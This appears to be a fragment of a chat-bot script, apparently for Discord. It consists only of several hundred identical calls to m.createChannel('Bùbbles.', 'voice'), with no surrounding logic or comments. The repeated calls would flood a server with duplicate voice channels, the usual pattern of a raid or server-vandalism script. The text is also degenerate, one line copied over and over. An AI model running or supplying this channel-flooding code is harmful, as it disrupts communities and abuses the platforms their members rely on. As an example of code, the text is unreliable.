m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice'); 
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
